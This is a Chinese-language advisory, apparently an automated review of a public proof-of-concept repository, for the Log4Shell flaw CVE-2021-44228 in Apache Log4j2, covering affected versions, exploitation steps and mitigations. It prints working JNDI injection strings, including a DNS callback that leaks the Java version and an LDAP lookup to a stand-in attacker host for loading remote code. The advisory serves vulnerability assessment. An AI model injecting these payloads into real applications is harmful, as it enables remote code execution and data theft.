## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标应用程序使用受影响的Log4j2版本，并且允许消息查找替换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意的 JNDI 查找字符串注入到 Log4j2 可以记录的任何输入中来利用此漏洞。当 Log4j2 尝试解析并执行该 JNDI 查找时，它可能会从攻击者控制的 LDAP 或其他 JNDI 相关端点加载任意代码。

**有效性：**
提供的 PoC 代码是有效的。它使用 `${jndi:dns://${sys:java.version}.z72ouf.dnslog.cn}` 格式的 JNDI 注入，该注入会触发 DNS 查询到 `z72ouf.dnslog.cn`，从而验证漏洞是否已成功利用。 `${sys:java.version}` 获取Java版本号。

**投毒风险：**
此仓库中不太可能存在作者隐藏的投毒代码（0%）。提供的文件看起来直接针对演示和利用 CVE-2021-44228 漏洞。 `pom.xml` 文件定义了 log4j-core 和 log4j-api 的依赖项。`log4j2.xml` 文件配置了基本的日志记录。 `CVE202144228.java` 文件包含利用该漏洞的有效负载，该负载会生成 DNS 查询以进行验证。 由于该PoC的主要作用是为了验证漏洞，而非植入后门，因此认为投毒风险低。

**利用方式：**
1.  攻击者找到应用程序中记录用户可控输入的位置。 这些位置可能包括 HTTP header，POST 数据，GET 参数等，总之，所有程序日志可以记录的地方。
2.  攻击者将恶意 JNDI 查找字符串（例如`${jndi:ldap://attacker.com/Exploit}`）注入到此输入中。
3.  当应用程序记录此输入时，Log4j2 会尝试解析 JNDI 查找。
4.  Log4j2 会连接到攻击者控制的 LDAP 服务器（或其他的 JNDI 服务）。
5.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
6.  Log4j2 加载并执行此恶意 Java 类，从而允许攻击者在目标系统上执行任意代码。
7. 缓解措施包括升级 Log4j2 到 >=2.17.0 版本，禁用 JNDI 查找，或设置 `log4j2.formatMsgNoLookups=true`。


**项目地址:** [ZacharyZcR/CVE-2021-44228](https://github.com/ZacharyZcR/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)